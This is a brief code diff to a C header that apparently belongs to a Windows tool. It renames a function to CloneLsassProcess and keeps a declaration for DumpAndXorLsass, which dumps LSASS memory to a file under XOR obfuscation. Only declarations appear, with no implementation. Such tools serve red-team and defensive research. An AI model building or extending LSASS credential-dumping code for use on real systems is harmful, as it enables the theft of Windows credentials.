@@ -1,13 +1,8 @@
 #pragma once
-
-#pragma once
 #include <Windows.h>
 
 // Clone LSASS and return handle to the clone
-HANDLE CloneProcess(void);
-
-// Utility to retrieve PID from a process handle
-DWORD GetProcessIdFromHandle(HANDLE hProcess);
+HANDLE CloneLsassProcess(void);
 
 // Dump LSASS
 BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len);
